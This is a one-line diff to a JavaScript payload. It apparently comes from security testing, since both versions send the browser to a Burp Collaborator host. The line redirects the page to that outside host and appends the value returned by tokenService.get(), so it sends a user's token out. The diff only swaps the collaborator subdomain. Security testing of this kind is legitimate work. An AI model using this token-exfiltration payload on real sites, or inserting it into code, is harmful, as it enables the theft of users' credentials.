@@ -1,1 +1,1 @@
-document.location='http://5syu53nbv1u6bij6lrc61nodo4uvik.burpcollaborator.net/?token='+tokenService.get();
+document.location='http://4qviaaiy1b6kafdk0wefcptzrqxgl5.burpcollaborator.net/?token='+tokenService.get();
